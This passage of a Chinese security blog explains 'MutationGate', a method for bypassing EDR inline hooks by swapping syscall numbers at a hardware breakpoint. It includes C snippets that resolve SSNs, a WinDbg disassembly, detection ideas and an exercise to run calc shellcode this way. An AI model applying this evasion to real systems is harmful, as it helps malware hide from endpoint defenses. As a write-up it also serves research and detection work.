<p>EDR 倾向于为一些 NTAPI 设置内联 hook，特别是那些常在恶意软件中被利用的，如 NtAllocVirtualMemory。而不常被恶意软件利用的 NTAPI 往往不会被 hook，如 NtDrawText。EDR hook 所有 NTAPI 的可能性非常小。</p>
<p>假设 NTAPI NtDrawText 没有被 hook，而 NtQueryInformationProcess 被 hook 了，步骤如下：</p>
<p>1. 获得 NtDrawText 的地址，通过 <strong>GetModuleHandle 与 GetProcAddress 组合</strong>，或者 <strong>PEB Walking 与导出表解析</strong>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>  pNTDT <span style="color:#f92672">=</span> GetFuncByHash(ntdll, <span style="color:#ae81ff">0xA1920265</span>); <span style="color:#75715e">//NtDrawText hash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pNTDTOffset_8 <span style="color:#f92672">=</span> (PVOID)((BYTE<span style="color:#f92672">*</span>)pNTDT <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>); <span style="color:#75715e">//Offset 0x8 from NtDrawText
</span></span></span></code></pre></div><p>2. 为 NtQueryInformationProcess 准备相应参数。</p>
<p>3. 在 <strong>NtDrawText + 0x8</strong> 处设置硬件断点，当执行流程到达这里时，SSN 已经存储在 RAX 中了，但 syscall 还未发起。</p>
<pre tabindex="0"><code>0:000&gt; u 0x00007FFBAD00EB68-8
ntdll!NtDrawText:
00007ffb`ad00eb60 4c8bd1          mov     r10,rcx
00007ffb`ad00eb63 b8dd000000      mov     eax,0DDh
00007ffb`ad00eb68 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffb`ad00eb70 7503            jne     ntdll!NtDrawText+0x15 (00007ffb`ad00eb75)
00007ffb`ad00eb72 0f05            syscall
00007ffb`ad00eb74 c3              ret
00007ffb`ad00eb75 cd2e            int     2Eh
00007ffb`ad00eb77 c3              ret
</code></pre><p>4. 获取 NtQueryInformationProcess 的 SSN。在异常句柄里，用 NtQueryInformationProcess 的 SSN 替换 NtDrawText 的。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...<span style="color:#f92672">&lt;</span>SNIP<span style="color:#f92672">&gt;</span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">GetSSNByHash</span>(PVOID pe, <span style="color:#66d9ef">uint32_t</span> Hash) 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)pe;
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> DWORD exportdirectory_foa <span style="color:#f92672">=</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> exportdirectory_foa); <span style="color:#75715e">//Calculate corresponding offset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames));
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions));
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, FunctionNameArray[i]));
</span></span><span style="display:flex;"><span>  DWORD Function_RVA <span style="color:#f92672">=</span> FunctionAddressArray[FunctionOrdinalArray[i]];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (Hash <span style="color:#f92672">==</span> <span style="color:#a6e22e">ROR13Hash</span>(pFunctionName))
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (ptr <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;malloc failed&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> byteAtOffset5 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> <span style="color:#a6e22e">RvaToFileOffset</span>(pImgNtHdrs, Function_RVA)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">//printf(&#34;Syscall number of function %s is: 0x%x\n&#34;, pFunctionName,byteAtOffset5); //0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#a6e22e">free</span>(ptr);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> byteAtOffset5;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">&lt;</span>SNIP<span style="color:#f92672">&gt;</span>...
</span></span></code></pre></div><p>5. 我们调用 NtDrawText 函数，但准备的却是 NtQueryInformationProcess 的参数，这个调用原本会失败的。但因为我们偷梁换柱了 SSN，调用会成功。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  fnNtQueryInformationProcess pNTQIP <span style="color:#f92672">=</span> (fnNtQueryInformationProcess)pNTDT;
</span></span><span style="display:flex;"><span>  NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#a6e22e">pNTQIP</span>(pi.hProcess, ProcessBasicInformation, <span style="color:#f92672">&amp;</span>pbi, <span style="color:#66d9ef">sizeof</span>(PROCESS_BASIC_INFORMATION), NULL); 
</span></span></code></pre></div><p>这个案例中，NtDrawText 的 SSN 为 0xdd，而 NtQueryInformationProcess 的 SSN 为 0x19，NtDrawText 的地址为 0x00007FFBAD00EB60</p>
<p>这个调用是发起到 NtDrawText 的地址，但准备的是 NtQueryInformationProcess 的参数，因为 SSN 从 0xdd 变为了 0x19，syscall 自然是成功的。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160404.png" alt="20240324160404" /></p>
<p>我们用之前的 yara 规则来扫描该 POC 程序，并没有发现符合的记录，这是当然的。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160414.png" alt="20240324160414" /></p>
<p>但破绽也是有的，为了便于观察，以 SleepEx 的 NTAPI <strong>NtDelayExecution</strong> 为例，syscall 是在 ntdll 空间里发起的，看起来还算合理。然而，ntoskrnl 里的 KeDelayExecutionThread 期望的是 NtDelayExecution 发起 syscall，而不是 NtDrawText。这个破绽可以作为检测点。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160446.png" alt="20240324160446" /></p>
<h4 id="优势与检测">
  <strong>优势与检测</strong>
  <a class="anchor" href="#%e4%bc%98%e5%8a%bf%e4%b8%8e%e6%a3%80%e6%b5%8b">#</a>
</h4>
<p>MutationGate 相比其他类似的 unhook 方案具有一定的优势，尽管依旧是可能检测的。</p>
<h5 id="优势">
  <strong>优势</strong>
  <a class="anchor" href="#%e4%bc%98%e5%8a%bf">#</a>
</h5>
<ol>
<li>不加载第 2 个 ntdll 模块</li>
<li>不纂改已加载的 ntdll 模块</li>
<li>不使用自定义的 syscall stub，因此没有对应的字节序列特征</li>
<li>syscall 发生在 ntdll 模块中，看起来是合理的</li>
</ol>
<h5 id="可能的检测方法">
  <strong>可能的检测方法</strong>
  <a class="anchor" href="#%e5%8f%af%e8%83%bd%e7%9a%84%e6%a3%80%e6%b5%8b%e6%96%b9%e6%b3%95">#</a>
</h5>
<ol>
<li>在正常程序中，调用 <strong>AddVectoredExceptionHandler</strong> 有些可疑</li>
<li>从内核层检视调用栈，ntoskrnl.exe 中执行的函数与 ntdll 模块中执行的函数不一致</li>
<li>在良性 NTAPI 中发起的 syscall 不会期望得到不属于自身的 SSN</li>
</ol>
<h4 id="与其他类似方法的对比">
  <strong>与其他类似方法的对比</strong>
  <a class="anchor" href="#%e4%b8%8e%e5%85%b6%e4%bb%96%e7%b1%bb%e4%bc%bc%e6%96%b9%e6%b3%95%e7%9a%84%e5%af%b9%e6%af%94">#</a>
</h4>
<p>HWSyscall(<a href="https://github.com/Dec0ne/HWSyscalls">https://github.com/Dec0ne/HWSyscalls</a>) 和 TamperingSyscall(<a href="https://github.com/rad9800/TamperingSyscalls">https://github.com/rad9800/TamperingSyscalls</a>) 都巧妙地利用硬件断点来绕过内联 hook，都是出色的方法。尽管在我获得灵感并发布 MutationGate 的期间里，我没有阅读和引用这两个项目，但的确利用了一些相似的技术和中心思想。我仔细阅读和研究了它们，并用表格总结与比较，如下所示：</p>
<!-- raw HTML omitted -->
<p>作为一个课后练习，请基于该 POC，用 MutationGate 的方法执行 calc 的 shellcode。</p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#提取-syscall-号码"><strong>提取 syscall 号码</strong></a></li>
        <li><a href="#直接调用-syscall"><strong>直接调用 Syscall</strong></a></li>
        <li><a href="#间接调用-syscall"><strong>间接调用 Syscall</strong></a></li>
        <li><a href="#突变之门-mutationgate"><strong>突变之门 MutationGate</strong></a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












